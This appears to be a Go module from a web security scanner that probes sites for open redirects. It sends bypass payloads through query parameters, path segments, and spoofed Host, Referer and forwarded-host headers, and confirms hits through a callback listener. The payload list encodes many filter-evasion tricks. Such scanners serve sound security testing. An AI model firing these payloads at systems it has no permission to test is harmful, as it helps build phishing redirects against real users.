package openredirect

import (
	"context"
	"fmt"
	"hash/fnv"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/Indigo6415/Aperture/internal/collaborator"
)

// commonRedirectParams covers the parameter-naming conventions seen across
// login flows, SSO callbacks, and generic "go back to where you were"
// links -- OWASP's and PortSwigger's own open-redirect testing checklists
// both converge on roughly this set.
var commonRedirectParams = []string{
	"redirect", "redirect_uri", "redirect_url", "redirecturl", "url", "next", "return", "returnto", "return_to",
	"returnurl", "return_url", "continue", "redir", "dest", "destination", "target", "rurl", "forward", "out",
	"view", "path", "r", "u", "link", "goto", "checkout_url", "image_url", "callback", "success_url", "failure_url",
}

// pathRedirectSegments are route names that take the destination as the
// next path segment instead of a query parameter (e.g. "/redirect/https://
// evil.example/" or "/go/https://evil.example/"). Tested at the target's
// origin root, since that's where these routes are almost always mounted.
var pathRedirectSegments = []string{
	"redirect", "redir", "redirect_to", "redirectto", "out", "go", "goto", "link", "exit",
	"away", "jump", "leave", "continue", "next", "return", "url", "r", "to", "visit",
}

// forwardedHostHeaders are the non-standard headers reverse proxies and
// frameworks use to tell the app which host the client "really" asked for.
// An app that builds its own absolute URLs (a redirect back to the site, a
// canonical link) from one of these instead of the validated Host header
// bounces the visitor to whatever value the attacker put there.
var forwardedHostHeaders = []string{
	"X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "X-HTTP-Host-Override", "X-Original-Host", "Forwarded-Host",
}

// maxRedirectHops bounds how far the confirmation walk follows a Location
// chain when Request.FollowRedirects is on. Enough for the common shapes
// (an http->https upgrade, then a "return to" bounce, then the redirect)
// without letting a redirect loop run the scan out of budget.
const maxRedirectHops = 5

// metaRefreshRe and jsRedirectRe find the redirect literals of a *client-side*
// redirect in a response body: a <meta http-equiv=refresh> content attribute,
// and a string literal assigned to location.href, location.replace() or
// location.assign(). Capture group 1 is the content or literal text. A page
// that only echoes the probe's value (in an input, an error message, or a
// "did you mean" line) has no such literal, so it is not a redirect.
var (
	metaRefreshRe = regexp.MustCompile(`(?is)<meta[^>]+http-equiv\s*=\s*["']?refresh["']?[^>]*content\s*=\s*["']([^"']*)["']`)
	jsRedirectRe  = regexp.MustCompile("(?is)(?:\\blocation(?:\\.href)?\\s*=|\\blocation\\.(?:replace|assign)\\s*\\()\\s*[\"'`]([^\"'`]*)[\"'`]")
)

// clientRedirectTo reports whether the body has a client-side redirect literal
// that names both the callback host and this probe's identifier. Requiring
// both means an unrelated script (location.href = "/home") that happens to sit
// on a page echoing the probe is not treated as a redirect to the callback.
func clientRedirectTo(body, cbHost, identifier string) bool {
	for _, target := range clientRedirectTargets(body) {
		if strings.Contains(target, cbHost) && strings.Contains(target, identifier) {
			return true
		}
	}
	return false
}

// clientRedirectTargets returns the destination text of each client-side
// redirect in body. For a meta refresh that is the part after "url=", and for
// a script redirect it is the string literal that was assigned.
func clientRedirectTargets(body string) []string {
	var out []string
	// Each meta match carries its content attribute, which holds "delay;url=...".
	for _, m := range metaRefreshRe.FindAllStringSubmatch(body, -1) {
		content := m[1]
		if i := strings.Index(strings.ToLower(content), "url="); i >= 0 {
			out = append(out, strings.Trim(content[i+len("url="):], " '\""))
		}
	}
	// Each script match carries the literal that was assigned to location.
	for _, m := range jsRedirectRe.FindAllStringSubmatch(body, -1) {
		out = append(out, m[1])
	}
	return out
}

// moduleDef is one vector family -- expand turns it into the concrete
// requests to send for this particular run (one per candidate parameter,
// per path segment, per header, ...). Every probe a module expands to is
// attributed individually via its own identifier.
type moduleDef struct {
	id, name, severity string
	expand             func(d runDeps) []probeSpec
}

// probeSpec is one concrete request a module wants sent.
type probeSpec struct {
	// label names what was tampered with ("Parameter \"next\"", "Header
	// \"X-Forwarded-Host\"", ...) -- used in finding titles.
	label string
	// sent is the payload exactly as the operator would read it in a
	// request ("next=https://…", "X-Forwarded-Host: …") -- used in finding
	// details.
	sent string
	// identifier is the callback path segment that attributes a hit to
	// this probe alone.
	identifier string
	// rawURL is the full URL this probe requests.
	rawURL string
	// headers are added on top of the operator's own headers for this
	// probe only.
	headers map[string]string
	// schemeless marks a probe whose injected value has no scheme: either a
	// bare host (the Host header) or host plus the callback path with the
	// identifier in it (the forwarded-host headers). The scheme is the only
	// part a header can't carry. If the app's redirect drops the identifier
	// path, confirmURL rebuilds the callback URL under it instead.
	schemeless bool
}

// candidate is a probe whose response redirected toward the callback host.
// It still isn't a Finding -- only one whose identifier shows up in the
// callback poll becomes one.
type candidate struct {
	spec probeSpec
	res  *orResult
	how  string
	// rebuilt is set when the confirming callback URL was built by the
	// scanner rather than taken from the target's redirect, because the
	// redirect didn't keep the probe's identifier.
	rebuilt bool
	// chain is every request made from the probe to the callback, in order,
	// carried onto the Finding if the callback poll confirms this candidate.
	chain []ChainHop
}

// runDeps is what every module's expand and every probe needs for one run.
type runDeps struct {
	target *url.URL
	req    Request
	params []string
	// origin is scheme://host of target -- the base for path-segment
	// probes, which don't reuse the target's own path.
	origin string
	sem    chan struct{}
	// nonce is this run's random identifier suffix (see
	// openRedirectIdentifierFor).
	nonce string
	// stats counts this run's requests and timeouts (see runStats).
	stats *runStats
}

// poison is the callback address one probe should reach: the run's
// CallbackBase plus this probe's identifier as the path segment after it.
func (d runDeps) poison(identifier string) string {
	return d.req.CallbackBase + "/" + identifier
}

// queryModule builds a payload module that tries build's value against
// every candidate query parameter. build gets the callback address this
// probe should reach and the target itself, for payloads that embed the
// target's own host to look legitimate.
func queryModule(id, name, severity string, build func(poison string, target *url.URL) string) moduleDef {
	return moduleDef{
		id: id, name: name, severity: severity,
		expand: func(d runDeps) []probeSpec {
			specs := make([]probeSpec, 0, len(d.params))
			// One probe per candidate parameter, each with its own
			// identifier so a hit can be pinned to one (payload, parameter).
			for _, p := range d.params {
				identifier := openRedirectIdentifierFor(id, p, d.nonce)
				value := build(d.poison(identifier), d.target)
				specs = append(specs, probeSpec{
					label:      fmt.Sprintf("Parameter %q", p),
					sent:       fmt.Sprintf("%s=%s", p, value),
					identifier: identifier,
					rawURL:     withParam(d.target, p, value),
				})
			}
			return specs
		},
	}
}

// pathModule builds a payload module that tries build's value as the
// destination segment of every route name in pathRedirectSegments, e.g.
// "/go/https://<poison>/".
func pathModule(id, name, severity string, build func(poison string) string) moduleDef {
	return moduleDef{
		id: id, name: name, severity: severity,
		expand: func(d runDeps) []probeSpec {
			specs := make([]probeSpec, 0, len(pathRedirectSegments))
			// One probe per route name, each attributable on its own.
			for _, seg := range pathRedirectSegments {
				identifier := openRedirectIdentifierFor(id, seg, d.nonce)
				value := build(d.poison(identifier))
				specs = append(specs, probeSpec{
					label:      fmt.Sprintf("Path /%s/", seg),
					sent:       fmt.Sprintf("GET /%s/%s", seg, value),
					identifier: identifier,
					rawURL:     d.origin + "/" + seg + "/" + value,
				})
			}
			return specs
		},
	}
}

// refererModule sends the target with a Referer pointing at the callback.
// Apps that bounce the user "back where you came from" after login or
// logout redirect to whatever Referer they were given. The identifier rides
// in the Referer's own path, so the redirect's Location carries it and no
// rewrite is needed.
var refererModule = moduleDef{
	id: "referer", name: "Referer-based redirect", severity: "medium",
	expand: func(d runDeps) []probeSpec {
		identifier := openRedirectIdentifierFor("referer", "Referer", d.nonce)
		value := "https://" + d.poison(identifier) + "/"
		return []probeSpec{{
			label:      "Referer header",
			sent:       "Referer: " + value,
			identifier: identifier,
			rawURL:     d.target.String(),
			headers:    map[string]string{"Referer": value},
		}}
	},
}

// hostHeaderModule sends the target with its Host header replaced by the
// callback host. An app that builds its own absolute URLs from the Host
// header (a redirect to "https://<Host>/", a canonical link) bounces the
// visitor to the injected host -- the vulnerability is in the server
// trusting Host, not in any query parameter.
var hostHeaderModule = moduleDef{
	id: "host-header", name: "Host header redirect", severity: "medium",
	expand: func(d runDeps) []probeSpec {
		cbHost := hostOnly(d.req.CallbackBase)
		identifier := openRedirectIdentifierFor("host-header", "Host", d.nonce)
		return []probeSpec{{
			label:      "Host header",
			sent:       "Host: " + cbHost,
			identifier: identifier,
			rawURL:     d.target.String(),
			headers:    map[string]string{"Host": cbHost},
			schemeless: true,
		}}
	},
}

// forwardedHostModule is hostHeaderModule for the proxy-supplied variants:
// each X-Forwarded-Host-style header on its own, plus the standard
// Forwarded header (RFC 7239), which carries the host as host="...".
var forwardedHostModule = moduleDef{
	id: "forwarded-host", name: "Forwarded-host header redirect", severity: "medium",
	expand: func(d runDeps) []probeSpec {
		specs := make([]probeSpec, 0, len(forwardedHostHeaders)+1)
		// One probe per header so a redirect can be pinned to the exact
		// header the app trusted.
		for _, h := range forwardedHostHeaders {
			identifier := openRedirectIdentifierFor("forwarded-host", h, d.nonce)
			// The value is the callback host plus this probe's identifier
			// path, with no scheme. A proxy-supplied host can carry a path,
			// so an app that echoes the whole value into its redirect
			// sends visitors to the identifier path itself.
			value := d.poison(identifier)
			specs = append(specs, probeSpec{
				label:      fmt.Sprintf("Header %q", h),
				sent:       h + ": " + value,
				identifier: identifier,
				rawURL:     d.target.String(),
				headers:    map[string]string{h: value},
				schemeless: true,
			})
		}
		// The RFC 7239 Forwarded header quotes its host value; the quotes
		// are required once a port is present, and they also let the path
		// through.
		identifier := openRedirectIdentifierFor("forwarded-host", "Forwarded", d.nonce)
		fwd := `host="` + d.poison(identifier) + `"`
		specs = append(specs, probeSpec{
			label:      `Header "Forwarded"`,
			sent:       "Forwarded: " + fwd,
			identifier: identifier,
			rawURL:     d.target.String(),
			headers:    map[string]string{"Forwarded": fwd},
			schemeless: true,
		})
		return specs
	},
}

// openRedirectModules is every vector this scanner tries. Each query-parameter
// payload is a distinct parser-disagreement shape (see PortSwigger's URL
// validation bypass cheat sheet and the OWASP open-redirect guidance): the
// point is that a filter which rejects one of them often accepts another.
var openRedirectModules = []moduleDef{
	// A plain absolute URL -- what an unfiltered parameter just accepts.
	queryModule("absolute-url", "Absolute-URL redirect", "medium", func(p string, _ *url.URL) string {
		return "https://" + p + "/"
	}),
	// No scheme at all -- the browser reuses the current page's scheme, so
	// this alone bypasses a filter that only rejects values starting "http".
	queryModule("protocol-relative", "Protocol-relative redirect", "medium", func(p string, _ *url.URL) string {
		return "//" + p + "/"
	}),
	// "%2F%2F<poison>" is "//<poison>" already percent-encoded once; the
	// query encoder encodes the '%' again on the wire, so the app sees the
	// still-encoded value. A filter checking the raw value for a literal
	// "//" misses it, and a second decode (client-side JS, or an app that
	// re-decodes) resolves it to the protocol-relative payload above.
	queryModule("double-encoded", "Double-URL-encoded redirect", "medium", func(p string, _ *url.URL) string {
		return "%2F%2F" + p
	}),
	// "/\<poison>" passes a prefix check for a leading "/" but is normalized
	// by browsers (backslash -> slash) into the protocol-relative payload.
	queryModule("backslash-trick", "Backslash-normalization redirect", "low", func(p string, _ *url.URL) string {
		return "/\\" + p
	}),
	// "\\<poison>" is the same normalization with both leading characters
	// backslashes -- filters that only expect forward slashes miss it.
	queryModule("backslash-protocol-relative", "Double-backslash redirect", "medium", func(p string, _ *url.URL) string {
		return "\\\\" + p + "/"
	}),
	// Four slashes: browsers collapse the run into an authority separator,
	// but a "starts with //" check, or a parser that stops at the second
	// slash, reads it as a path.
	queryModule("slash-run", "Slash-run redirect", "medium", func(p string, _ *url.URL) string {
		return "////" + p + "/"
	}),
	// "https://<real-host>@<poison>" starts with the real target's own URL,
	// which passes a naive "starts with our domain" check -- but every URL
	// parser treats everything before "@" as userinfo and resolves the
	// request to poison.
	queryModule("userinfo-trick", "Userinfo (@) redirect", "medium", func(p string, t *url.URL) string {
		return "https://" + t.Host + "@" + p + "/"
	}),
	// "https:<poison>" with no slashes: browsers read it as an absolute
	// https URL, but a filter looking for "https://" misses it.
	queryModule("missing-slashes", "Missing-slashes scheme redirect", "low", func(p string, _ *url.URL) string {
		return "https:" + p + "/"
	}),
	// Bare host with no scheme or slashes -- for apps that prepend their
	// own scheme ("https://" + value) before redirecting.
	queryModule("bare-host", "Bare-host redirect", "low", func(p string, _ *url.URL) string {
		return p + "/"
	}),
	// A literal tab inside the value: browsers strip ASCII tab/newline from
	// anywhere in a URL, so "/\t/<poison>" becomes "//<poison>" once
	// parsed, while the filter only ever saw a harmless-looking "/" prefix.
	queryModule("whitespace-control", "Tab-injection redirect", "low", func(p string, _ *url.URL) string {
		return "/\t/" + p + "/"
	}),
	// Leading space: browsers strip leading C0-control and space characters,
	// so " //<poison>" resolves as protocol-relative even though a filter
	// that checks the first character sees a space.
	queryModule("leading-whitespace", "Leading-whitespace redirect", "low", func(p string, _ *url.URL) string {
		return " //" + p + "/"
	}),
	// The target's own host appears only after the attacker's host (in the
	// query), so a "does the value contain our domain?" check passes.
	queryModule("allowlist-substring", "Allowlist substring redirect", "medium", func(p string, t *url.URL) string {
		return "https://" + p + "/?" + t.Hostname()
	}),
	// The target's host placed after a fragment: a "contains our domain" check
	// passes, and the browser never sends the fragment to the server.
	queryModule("allowlist-fragment", "Allowlist fragment redirect", "medium", func(p string, t *url.URL) string {
		return "https://" + p + "/#" + t.Hostname()
	}),
	// The target's host placed in the path instead of the authority, for a
	// check that only looks for the domain anywhere in the value.
	queryModule("allowlist-path", "Allowlist path redirect", "medium", func(p string, t *url.URL) string {
		return "https://" + p + "/" + t.Hostname()
	}),
	// Three slashes: browsers collapse the run to an authority separator, but
	// a "starts with //" check, or a parser that stops at the second slash,
	// reads it as a path.
	queryModule("triple-slash", "Triple-slash redirect", "medium", func(p string, _ *url.URL) string {
		return "///" + p + "/"
	}),
	// "/\/" normalizes to "//" in a browser (backslash becomes slash), but
	// reads as a path to a filter that only checks the second character.
	queryModule("backslash-slash", "Backslash-slash redirect", "medium", func(p string, _ *url.URL) string {
		return "/\\/" + p + "/"
	}),
	// The scheme written with backslashes, which browsers read as "https://".
	// A filter that matches "https://" literally does not see it.
	queryModule("https-backslash", "Scheme backslash redirect", "medium", func(p string, _ *url.URL) string {
		return "https:\\\\" + p + "/"
	}),
	// The scheme followed by three slashes: the run collapses to "//" after
	// the scheme, so the host is still read correctly by a browser.
	queryModule("https-triple-slash", "Scheme triple-slash redirect", "medium", func(p string, _ *url.URL) string {
		return "https:///" + p + "/"
	}),

	pathModule("path-absolute", "Path-segment absolute redirect", "medium", func(p string) string {
		return "https://" + p + "/"
	}),
	pathModule("path-protocol-relative", "Path-segment protocol-relative redirect", "medium", func(p string) string {
		return "//" + p + "/"
	}),

	refererModule,
	hostHeaderModule,
	forwardedHostModule,
}

// hostOnly returns s up to (not including) its first "/" -- just the host
// portion of a "host[:port]/path" string like Request.CallbackBase.
func hostOnly(s string) string {
	host, _, _ := strings.Cut(s, "/")
	return host
}

// openRedirectIdentifierFor derives a URL-path-safe identifier for one
// (module, label, run) triple -- used on every probe, so each request stays
// individually attributable in the Collaborator tab even though they all
// share one operator-picked token. The readable prefix alone can collide
// ("URL" vs "url" once lowercased), so an FNV hash of the exact pair is
// appended. nonce is the run's own random value: a shared token keeps every
// earlier run's hits, and without it a later run would be credited with a
// hit that an earlier run produced for the same module and parameter.
func openRedirectIdentifierFor(moduleID, label, nonce string) string {
	var b strings.Builder
	b.WriteString("or-")
	b.WriteString(moduleID)
	b.WriteByte('-')
	for _, r := range label {
		switch {
		case r >= 'a' && r <= 'z', r >= '0' && r <= '9':
			b.WriteRune(r)
		case r >= 'A' && r <= 'Z':
			b.WriteRune(r + ('a' - 'A'))
		default:
			b.WriteByte('-')
		}
	}
	h := fnv.New32a()
	h.Write([]byte(moduleID + "/" + label))
	fmt.Fprintf(&b, "-%08x-%s", h.Sum32(), nonce)
	return b.String()
}

// runModule expands m into its probes and fires them all concurrently
// (throttled by d.sem), returning every probe whose response led toward the
// callback host. Those are only candidates: a Finding needs the callback
// poll in Run to see the probe's identifier as well.
func runModule(ctx context.Context, d runDeps, m moduleDef, sent *atomic.Int64) []candidate {
	specs := m.expand(d)
	sent.Add(int64(len(specs)))

	var (
		mu  sync.Mutex
		out []candidate
		wg  sync.WaitGroup
	)
	// Each probe gets its own goroutine; d.sem is what bounds how many
	// requests are actually in flight at once.
	for _, ps := range specs {
		wg.Add(1)
		go func(ps probeSpec) {
			defer wg.Done()
			c, ok := runProbe(ctx, d, ps)
			if !ok {
				return
			}
			mu.Lock()
			out = append(out, c)
			mu.Unlock()
		}(ps)
	}
	wg.Wait()
	return out
}

// runProbe sends one probe, looks for a redirect toward the callback host in
// its response (following the chain when the operator asked for that), and
// if it finds one, requests the callback address itself so the listener
// records the hit. It returns ok=false when the probe never pointed at the
// callback host, so the probe can't be a candidate. The candidate carries a
// timed hop for every request made along the way, so a Finding can show the
// whole path from the target to the callback.
func runProbe(ctx context.Context, d runDeps, ps probeSpec) (candidate, bool) {
	res, probeHop, err := d.timedSend(ctx, "probe", ps.rawURL, mergeHeaders(d.req.Headers, ps.headers))
	if err != nil {
		return candidate{}, false
	}
	base, err := url.Parse(ps.rawURL)
	if err != nil {
		return candidate{}, false
	}

	followed, confirm, how, rebuilt, ok := d.findCallbackHop(ctx, res, base, ps)
	if !ok {
		return candidate{}, false
	}
	// The confirming request goes to the external callback host with no
	// operator headers: those credentials belong to the target, and
	// sending them to a third-party listener would leak them. Errors are
	// discarded -- a failed hit just means this probe isn't confirmed. The
	// hop is still recorded (with its error, if any) so the chain shows it.
	// Sent without a concurrency slot: confirmations are few, and queueing them
	// behind probes hanging on the target would delay the hit by the probe timeout.
	_, confirmHop, err := d.timedRequest(ctx, ChainHop{Kind: "callback", Method: http.MethodGet, URL: confirm}, confirm, nil)
	// One transport error on the callback request would drop a real hit, so it
	// is retried once. A cancelled run is not retried, since it cannot succeed.
	if err != nil && ctx.Err() == nil {
		_, confirmHop, _ = d.timedRequest(ctx, ChainHop{Kind: "callback", Method: http.MethodGet, URL: confirm}, confirm, nil)
	}

	chain := append([]ChainHop{probeHop}, followed...)
	chain = append(chain, confirmHop)
	finalizeChain(chain)
	return candidate{spec: ps, res: res, how: how, rebuilt: rebuilt, chain: chain}, true
}

// findCallbackHop walks the redirect chain starting at res, looking for a
// hop whose Location points at the callback host. With FollowRedirects off
// only the first hop is inspected; on, up to maxRedirectHops are followed,
// so a redirect that reaches the callback through an intermediate page
// (login, normalization, "return to") still counts.
//
// It returns the intermediate hops it requested while walking (not including
// res itself, which the caller already holds), the URL to confirm against, a
// short description of how the redirect was detected, whether that confirm
// URL was rebuilt by the scanner rather than taken from the redirect, and
// whether one was found. If the response has no Location at all, the body is
// checked for a client-side redirect instead.
func (d runDeps) findCallbackHop(ctx context.Context, res *orResult, base *url.URL, ps probeSpec) ([]ChainHop, string, string, bool, bool) {
	cbHost := hostOnly(d.req.CallbackBase)
	maxHops := 1
	if d.req.FollowRedirects {
		maxHops = maxRedirectHops
	}

	var followed []ChainHop
	hop, cur := res, base
	// Walk one hop at a time; each iteration checks the current hop's
	// Location, then (if following) requests it to find the next one.
	for i := 0; i < maxHops && isRedirect(hop); i++ {
		loc, err := browserResolve(cur, hop.Location)
		if err != nil {
			break
		}
		if strings.EqualFold(loc.Host, cbHost) {
			confirm, rebuilt := d.confirmURL(loc, ps)
			how := "redirected (Location header)"
			if rebuilt {
				how = "redirected (Location header, callback path rebuilt by scanner)"
			}
			return followed, confirm, how, rebuilt, true
		}
		// Last permitted hop reached without finding the callback -- stop
		// rather than issuing one more request nobody will inspect.
		if i+1 == maxHops {
			break
		}
		next, nextHop, err := d.timedSend(ctx, "redirect", loc.String(), d.chainHeaders(loc))
		followed = append(followed, nextHop)
		if err != nil {
			break
		}
		hop, cur = next, loc
	}

	// No redirect in the chain reached the callback. A 2xx body may still
	// describe a client-side redirect to it. Only a redirect literal that names
	// the callback host and this probe's identifier is worth confirming.
	if !isRedirect(res) && clientRedirectTo(res.Body, cbHost, ps.identifier) {
		return followed, "https://" + d.poison(ps.identifier) + "/", "rendered a client-side redirect", true, true
	}
	return followed, "", "", false, false
}

// timedSend is send for a request that becomes a hop in a finding's chain.
// It takes a concurrency slot itself and starts the clock only once the slot
// is held, so time spent queued behind other probes isn't counted as the
// target's latency. The returned hop records the outcome whether or not the
// request succeeded.
func (d runDeps) timedSend(ctx context.Context, kind, rawURL string, headers map[string]string) (*orResult, ChainHop, error) {
	hop := ChainHop{Kind: kind, Method: http.MethodGet, URL: rawURL}
	// Holding the slot for the whole request is what bounds in-flight
	// requests; send itself is called unthrottled below so it isn't taken twice.
	if d.sem != nil {
		select {
		case d.sem <- struct{}{}:
		case <-ctx.Done():
			hop.started = time.Now()
			hop.Error = ctx.Err().Error()
			return nil, hop, ctx.Err()
		}
		defer func() { <-d.sem }()
	}

	return d.timedRequest(ctx, hop, rawURL, headers)
}

// timedRequest sends one request and records its timing on hop, without
// touching the concurrency slot. timedSend calls it while holding a slot; the
// callback confirmation calls it directly so it never waits behind probes
// that are hanging on the target.
func (d runDeps) timedRequest(ctx context.Context, hop ChainHop, rawURL string, headers map[string]string) (*orResult, ChainHop, error) {
	hop.started = time.Now()
	res, err := send(ctx, nil, rawURL, headers)
	d.stats.record(ctx, err)
	hop.DurationMs = float64(time.Since(hop.started)) / float64(time.Millisecond)
	if err != nil {
		hop.Error = err.Error()
		return nil, hop, err
	}
	hop.Method = res.Request.Method
	hop.StatusCode = res.StatusCode
	hop.Location = res.Location
	hop.Headers = res.Request.Headers
	return res, hop, nil
}

// finalizeChain numbers a chain's hops from 1 and sets each hop's OffsetMs
// relative to the first request, so the timeline reads from the moment the
// probe went out.
func finalizeChain(chain []ChainHop) {
	if len(chain) == 0 {
		return
	}
	origin := chain[0].started
	for i := range chain {
		chain[i].Step = i + 1
		chain[i].OffsetMs = float64(chain[i].started.Sub(origin)) / float64(time.Millisecond)
	}
}

// confirmURL is the request that confirms a hit for a redirect that reached
// the callback host at loc. When the redirect's own URL carries this probe's
// identifier, that URL is the confirmation -- it is the hop the target sent.
// A schemeless probe whose redirect dropped the identifier has no such URL,
// so the callback is requested under the identifier path instead, and
// rebuilt reports that the scanner built it.
func (d runDeps) confirmURL(loc *url.URL, ps probeSpec) (confirm string, rebuilt bool) {
	// Non-schemeless probes always carry the identifier in the payload, so
	// their redirect is confirmed as-is.
	if !ps.schemeless || pathCarries(loc, ps.identifier) {
		return loc.String(), false
	}
	return loc.Scheme + "://" + d.poison(ps.identifier) + "/", true
}

// pathCarries reports whether one of loc's path segments is exactly id. It is
// how a redirect is shown to have kept a probe's identifier.
func pathCarries(loc *url.URL, id string) bool {
	// Compare whole segments, so an identifier can't match part of another path.
	for _, seg := range strings.Split(loc.Path, "/") {
		if seg == id {
			return true
		}
	}
	return false
}

// chainHeaders returns what a followed hop should carry. Only hops that stay
// on the target's own host get the operator's headers (session cookies,
// tokens) -- anything bounced to another host gets none, so credentials
// never leave for a third party.
func (d runDeps) chainHeaders(loc *url.URL) map[string]string {
	if strings.EqualFold(loc.Host, d.target.Host) {
		return d.req.Headers
	}
	return nil
}

// isRedirect reports whether res is a 3xx carrying a Location header --
// the only shape a redirect hop can take.
func isRedirect(res *orResult) bool {
	return res != nil && res.StatusCode >= 300 && res.StatusCode < 400 && res.Location != ""
}

// browserResolve resolves raw against base the way a browser would, not the
// way strict RFC 3986 would: leading and trailing C0/space characters and
// embedded tabs/newlines are stripped, backslashes become slashes, a run of
// slashes after "http:"/"https:" (or at the very start) collapses to "//",
// and a bare "https:host" gets its missing slashes back. Without this, the
// backslash, whitespace, and missing-slash probes would never resolve to the
// host the victim's browser actually goes to.
func browserResolve(base *url.URL, raw string) (*url.URL, error) {
	s := strings.TrimFunc(raw, func(r rune) bool { return r <= 0x20 })
	s = strings.NewReplacer("\t", "", "\n", "", "\r", "").Replace(s)
	s = strings.ReplaceAll(s, "\\", "/")

	lower := strings.ToLower(s)
	for _, scheme := range []string{"https:", "http:"} {
		// Normalize "https:" followed by any number of slashes (or none)
		// into "https://" so the host is read the way a browser reads it.
		if strings.HasPrefix(lower, scheme) {
			s = scheme + "//" + strings.TrimLeft(s[len(scheme):], "/")
			break
		}
	}
	// A run of slashes at the start is treated as an authority separator
	// by browsers, so "////host" means "//host".
	if strings.HasPrefix(s, "//") {
		s = "//" + strings.TrimLeft(s, "/")
	}
	return base.Parse(s)
}

// mergeHeaders returns base with extra layered on top. A key in base that
// matches one in extra case-insensitively is dropped first, so the probe's
// header always wins regardless of map iteration order -- and so an operator
// Host header can't be sent alongside a probe's own Host.
func mergeHeaders(base, extra map[string]string) map[string]string {
	out := make(map[string]string, len(base)+len(extra))
	for k, v := range base {
		if overridden(k, extra) {
			continue
		}
		out[k] = v
	}
	for k, v := range extra {
		out[k] = v
	}
	return out
}

// overridden reports whether key matches any name in extra, ignoring case
// (HTTP header names are case-insensitive).
func overridden(key string, extra map[string]string) bool {
	for k := range extra {
		if strings.EqualFold(k, key) {
			return true
		}
	}
	return false
}

// findingFor turns one confirmed candidate and the callback hits recorded
// against its identifier into the Finding shown to the operator.
func findingFor(c candidate, hits []collaborator.Interaction) Finding {
	h := hits[0]
	// The confirmation sentence depends on who built the confirming URL: the
	// target's own redirect, or the scanner after the redirect dropped the
	// identifier.
	confirmed := "Confirmed: the redirect was followed to the callback server, not just offered in a response that mentioned it."
	if c.rebuilt {
		confirmed = "Confirmed: the target's redirect pointed at the callback host, and the scanner then requested the callback itself under the probe's identifier, which the listener recorded."
	}
	detail := fmt.Sprintf(
		"Sent %s and the redirect reached the callback address (%s) -- %d inbound %s interaction(s) recorded, the first from %s. %s",
		c.spec.sent, c.how, len(hits), h.Protocol, h.RemoteAddr, confirmed,
	)
	if c.rebuilt {
		detail += " The redirect did not keep this probe's identifier path, so the hit was requested by the scanner, not followed from the redirect."
	}
	// Only a redirect the target sent with the identifier intact is fully
	// confirmed. A rebuilt callback URL, or a client-side literal, is "likely".
	confidence := ConfidenceConfirmed
	if c.rebuilt {
		confidence = ConfidenceLikely
	}
	return Finding{
		Label:      fmt.Sprintf("%s redirects to an attacker-controlled host (confirmed via callback)", c.spec.label),
		Detail:     detail,
		Evidence:   fmt.Sprintf("%s callback from %s at %s", h.Protocol, h.RemoteAddr, h.Timestamp.Format(time.RFC3339)),
		Method:     http.MethodGet,
		StatusCode: c.res.StatusCode,
		Request:    testerRequest(c),
		Chain:      c.chain,
		Confidence: confidence,
		// Built only from a callback hit, so the callback proves it, even when
		// the scanner (not the target) made the confirming request.
		Callback: true,
	}
}

// testerRequest is the request a finding hands to "Send to Tester". It carries
// every header the probe sent. For a schemeless probe the URL is the callback
// address that confirmed the hit, not the target the header was injected into.
// The probe itself stays in Chain.
func testerRequest(c candidate) *CapturedRequest {
	req := c.res.Request
	// Only schemeless probes need the URL swapped: for every other probe the
	// request URL already carries the callback inside its redirect value.
	if !c.spec.schemeless {
		return &req
	}
	// The confirming hop is the last one marked "callback" in the chain.
	for i := len(c.chain) - 1; i >= 0; i-- {
		if c.chain[i].Kind == "callback" {
			req.URL = c.chain[i].URL
			break
		}
	}
	return &req
}

// pollCallback fetches whatever's been recorded against cb's token so far,
// via whichever provider it names -- mirrors internal/jwtscan's own pollOOB.
// A poll failure (webhook.site unreachable) reads as "nothing yet" rather
// than an error, consistent with this whole pass treating "no confirmation"
// as the safe default.
func pollCallback(cb CallbackPollConfig) []collaborator.Interaction {
	if cb.Provider == "webhooksite" {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		hits, err := collaborator.PollWebhookSite(ctx, cb.Token)
		if err != nil {
			return nil
		}
		return hits
	}
	if cb.Registry == nil {
		return nil
	}
	return cb.Registry.Poll(cb.Token)
}
